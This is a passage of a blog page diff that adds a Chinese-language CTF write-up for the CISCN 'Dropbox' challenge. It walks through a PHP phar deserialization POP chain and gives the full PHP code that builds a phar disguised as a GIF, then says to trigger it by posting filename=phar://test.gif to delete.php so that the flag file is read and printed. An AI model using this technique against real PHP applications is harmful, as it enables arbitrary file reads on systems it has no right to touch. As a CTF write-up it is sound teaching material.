+    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>先找找有没有什么敏感函数，File类中open方法有file_exists可以触发phar的反序列化，close方法有file_get_contents可以读内容。所有就根据这两处找找利用链。最开始想到就是User类中的析构函数调用了db属性的close方法，可以把db赋值为一个File类，调用同名函数。<br>但是这有个问题，读完了文件并没有回显的地方，所以这其实是个坑。再看看发现回显是在FileList中call方法给list赋值，然后destruct中打印。<br>运行这个生成phar文件</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>
+    <span class="token comment" spellcheck="true">//签名自动计算</span>
+    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span><span class="token string">"test.gif"</span><span class="token punctuation">)</span>
+<span class="token delimiter">?></span></code></pre>
+<p>在删除的时候拿到flag<br>解释：<br>User-&gt;db是FileList类，Userdestruct时会调用db的close方法，因为FileList没有close方法所以触发call函数，call里面的逻辑就是再去调用$file的同名方法，$file是一个File类，所以就调用了File的close方法，读取了文件，存到FileList类的result中，destruct时候打印到页面。<br>有了pop链然后就是找触发反序列化的点，看上去有三个参数可控点可以触发，分别是download.php中和delete.php中调用的File类的open方法，其中有file_exist函数。另外是delete.php中调用的File的delete方法，里面有unlink函数。<br>但实际上unlink那里的没办法传参，参数是不可控的，只能通过open方法。而download中的open方法前面被open_basedir限制了路径，没办法利用。所以最后的触发点就是delete.php中的filename参数。上传伪装的phar文件test.gif，然后向delete.php用post发送filename=phar://test.gif就会在返回值中打印出flag     </p>
+<p>#参考链接<br><a href="http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/" target="_blank" rel="noopener">http://adm1n.design/2019/09/10/Ciscn%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Dropbox/</a><br><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715</a></p>
+
             </div>
             <hr/>
 
@@ -796,7 +1039,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">154.1k</span>&nbsp;字
+                class="white-color">155.3k</span>&nbsp;字
             
             
             
